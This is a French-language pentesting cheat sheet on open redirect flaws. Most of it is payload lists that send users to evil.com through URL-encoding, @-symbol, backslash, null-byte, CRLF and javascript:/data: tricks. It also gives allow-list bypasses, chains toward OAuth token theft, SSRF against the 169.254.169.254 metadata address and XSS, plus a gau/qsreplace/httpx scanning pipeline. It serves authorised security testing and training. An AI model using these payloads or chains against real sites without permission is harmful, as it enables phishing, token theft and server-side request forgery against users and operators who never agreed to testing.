# 🔀 Fiche pratique des redirections ouvertes

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
   ██████╗ ██████╗ ███████╗███╗   ██╗    ██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗
  ██╔═══██╗██╔══██╗██╔════╝████╗  ██║    ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝
  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║    ██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   
  ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║    ██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   
  ╚██████╔╝██║     ███████╗██║ ╚████║    ██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   
   ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   
```

---

> **Interprétation :** les variantes dépendent du parseur d’URL, du navigateur, du contexte de redirection et des contrôles du serveur ; elles ne garantissent pas un contournement. Un domaine contenant le nom attendu n’est pas nécessairement le domaine de confiance. Les schémas JavaScript ou data ne sont pas acceptés dans tous les contextes. Les exemples `alert(...)` montrent une exécution JavaScript, pas nécessairement une navigation. Voir le [standard URL](https://url.spec.whatwg.org/). Les URL et payloads sources restent inchangés, avec le texte du dessin ASCII.
>
> **Chaînes d’attaque :** l’exemple OAuth est illustratif : une valeur de `redirect_uri` ne suffit pas à prouver une fuite de jeton. Il faut établir le flux et ses contrôles ; voir les [bonnes pratiques OAuth 2.0](https://www.rfc-editor.org/rfc/rfc9700.html#section-4.1). Une redirection ne conduit pas automatiquement à une SSRF ou à une XSS.

## 🎯 Qu’est-ce qu’une redirection ouverte

Une **redirection ouverte** (Open Redirect) permet de diriger des utilisateurs vers un site malveillant en passant par un domaine de confiance. Elle peut faciliter le hameçonnage ou être combinée à d’autres vulnérabilités.

---

## 🔍 Paramètres courants

```
url=
redirect=
redirect_uri=
redirect_url=
next=
next_url=
return=
return_url=
rurl=
dest=
destination=
redir=
redirect_uri=
return_to=
checkout_url=
continue=
image_url=
go=
view=
to=
out=
ref=
callback=
```

---

## 💉 Charges utiles (payloads)

### Formes de base
```
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=http://evil.com
https://target.com/redirect?url=//evil.com
```

### Sans protocole explicite
```
//evil.com
///evil.com
////evil.com
/\/evil.com
```

### Utilisation du symbole @
```
https://target.com@evil.com
https://target.com%40evil.com
//target.com@evil.com
```

### Variantes avec barre oblique inverse
```
https://evil.com\@target.com
//evil.com\@target.com
https://target.com/redirect?url=https://evil.com\.target.com
```

### Encodage d’URL
```
https://evil.com
https:%2f%2fevil.com
https:%252f%252fevil.com
%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

### Confusion de domaines
```
https://evil.com?.target.com
https://evil.com#.target.com
https://evil.com\.target.com
https://target.com.evil.com
https://targetcom.evil.com
```

### Octets nuls
```
https://evil.com%00.target.com
https://evil.com%00@target.com
```

### Injection CRLF
```
https://target.com/redirect?url=%0d%0aLocation:%20https://evil.com
```

### Redirection JavaScript
```
javascript:alert(1)
javascript://target.com/%0d%0aalert(1)
data:text/html,<script>location='https://evil.com'</script>
```

---

## 🛡️ Techniques de contournement

### Lorsqu’une liste d’autorisation est vérifiée
```
# Contournement fondé sur les sous-domaines
https://target.com.evil.com
https://evil.target.com
https://targetcom.evil.com

# Contournement fondé sur le chemin
https://target.com/https://evil.com
https://target.com//evil.com
```

### Lorsque seul HTTPS est autorisé
```
https://evil.com
https://evil.com%2f%2ftarget.com
```

### Variantes avec localhost
```
http://localhost
http://127.0.0.1
http://[::1]
```

---

## 🔗 Combiner les redirections ouvertes avec d’autres failles

### Vol de jetons OAuth
```
https://target.com/oauth?redirect_uri=https://evil.com
→ Vol de jetons OAuth
```

### Chaîne menant à une SSRF
```
https://target.com/redirect?url=http://169.254.169.254/
```

### Chaîne menant à une XSS
```
https://target.com/redirect?url=javascript:alert(document.domain)
```

---

## 📊 Référence rapide

| Type de charge utile | Exemple |
|--------------|---------|
| Forme de base | `//evil.com` |
| Symbole @ | `https://target.com@evil.com` |
| Encodage | `https:%2f%2fevil.com` |
| Confusion de domaines | `https://target.com.evil.com` |
| JavaScript | `javascript:alert(1)` |

---

## 🛠️ Outils

```bash
# Motifs GF
gau target.com | gf redirect

# Tests manuels
echo "https://target.com/r?url=FUZZ" | \
  qsreplace "https://evil.com" | \
  httpx -silent -location
```

---

## 📚 Ressources

- [PortSwigger Open Redirect](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)

---

<p align="center">
  <b>🔀 Analysez les redirections !</b><br>
  <i>Uniquement dans le cadre de tests autorisés !</i>
</p>
